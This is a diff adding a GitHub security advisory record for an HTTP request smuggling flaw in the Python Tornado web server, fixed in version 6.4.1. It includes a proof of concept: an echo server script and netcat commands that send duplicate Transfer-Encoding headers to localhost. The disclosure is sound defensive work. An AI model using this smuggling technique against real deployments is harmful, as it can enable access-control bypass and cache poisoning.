@@ -1,0 +1,64 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-753j-mpmx-qq6g",
+  "modified": "2024-06-06T21:41:20Z",
+  "published": "2024-06-06T21:41:20Z",
+  "aliases": [
+
+  ],
+  "summary": "Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling') in tornado",
+  "details": "### Summary\nWhen Tornado receives a request with two `Transfer-Encoding: chunked` headers, it ignores them both. This enables request smuggling when Tornado is deployed behind a proxy server that emits such requests. [Pound](https://en.wikipedia.org/wiki/Pound_(networking)) does this.\n\n### PoC\n0. Install Tornado.\n1. Start a simple Tornado server that echoes each received request's body:\n```bash\ncat << EOF > server.py\nimport asyncio\nimport tornado\n\nclass MainHandler(tornado.web.RequestHandler):\n    def post(self):\n        self.write(self.request.body)\n\nasync def main():\n    tornado.web.Application([(r\"/\", MainHandler)]).listen(8000)\n    await asyncio.Event().wait()\n\nasyncio.run(main())\nEOF\npython3 server.py &\n```\n2. Send a valid chunked request:\n```bash\nprintf 'POST / HTTP/1.1\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nZ\\r\\n0\\r\\n\\r\\n' | nc localhost 8000\n```\n3. Observe that the response is as expected:\n```\nHTTP/1.1 200 OK\nServer: TornadoServer/6.3.3\nContent-Type: text/html; charset=UTF-8\nDate: Sat, 07 Oct 2023 17:32:05 GMT\nContent-Length: 1\n\nZ\n```\n4. Send a request with two `Transfer-Encoding: chunked` headers:\n```\nprintf 'POST / HTTP/1.1\\r\\nTransfer-Encoding: chunked\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nZ\\r\\n0\\r\\n\\r\\n' | nc localhost 8000\n```\n5. Observe the strange response:\n```\nHTTP/1.1 200 OK\nServer: TornadoServer/6.3.3\nContent-Type: text/html; charset=UTF-8\nDate: Sat, 07 Oct 2023 17:35:40 GMT\nContent-Length: 0\n\nHTTP/1.1 400 Bad Request\n\n```\nThis is because Tornado believes that the request has no message body, so it tries to interpret `1\\r\\nZ\\r\\n0\\r\\n\\r\\n` as its own request, which causes a 400 response. With a little cleverness involving `chunk-ext`s, you can get Tornado to instead respond 405, which has the potential to desynchronize the connection, as opposed to 400 which should always result in a connection closure.\n\n### Impact\nAnyone using Tornado behind a proxy that forwards requests containing multiple `Transfer-Encoding: chunked` headers is vulnerable to request smuggling, which may entail ACL bypass, cache poisoning, or connection desynchronization.\n",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "tornado"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "6.4.1"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "<= 6.4.0"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/tornadoweb/tornado/security/advisories/GHSA-753j-mpmx-qq6g"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tornadoweb/tornado/commit/d65f6e71a77f53a1ff0a0dc55704be13f04eb572"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/tornadoweb/tornado"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-444"
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-06-06T21:41:20Z",
+    "nvd_published_at": null
+  }
+}
